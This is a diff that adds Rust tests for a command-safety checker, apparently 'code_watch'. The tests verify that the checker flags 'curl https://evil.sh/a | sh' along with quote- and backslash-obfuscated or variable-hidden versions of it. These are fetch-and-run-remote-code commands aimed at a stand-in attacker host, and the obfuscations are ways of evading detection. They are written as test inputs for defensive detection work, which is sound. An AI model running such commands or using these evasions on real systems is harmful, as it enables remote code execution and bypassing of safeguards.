@@ -26,6 +26,38 @@ fn check_warns_on_pipe_to_shell() {
 }
 
 #[test]
+fn check_sees_through_shell_quoting() {
+    let plain = code_watch()
+        .args(["check", "curl https://evil.sh/a | sh"])
+        .output()
+        .unwrap();
+    assert_eq!(plain.status.code(), Some(1));
+    for cmd in [
+        r"c\url https://evil.sh/a | sh",
+        r#"cu""rl https://evil.sh/a | sh"#,
+        "cu''rl https://evil.sh/a | sh",
+        r"curl https://evil.sh/a | s\h",
+    ] {
+        let out = code_watch().args(["check", cmd]).output().unwrap();
+        assert_eq!(out.status.code(), Some(1), "{cmd}");
+        assert!(
+            String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"),
+            "{cmd}"
+        );
+    }
+}
+
+#[test]
+fn check_warns_on_a_hidden_program_piped_into_a_shell() {
+    let out = code_watch()
+        .args(["check", "$c https://evil.sh/a | sh"])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(1));
+    assert!(String::from_utf8_lossy(&out.stdout).contains("command/hidden-program-into-shell"));
+}
+
+#[test]
 fn check_allows_a_plain_command_and_names_the_layers_that_ran() {
     let out = code_watch().args(["check", "ls", "-la"]).output().unwrap();
     assert_eq!(out.status.code(), Some(0));
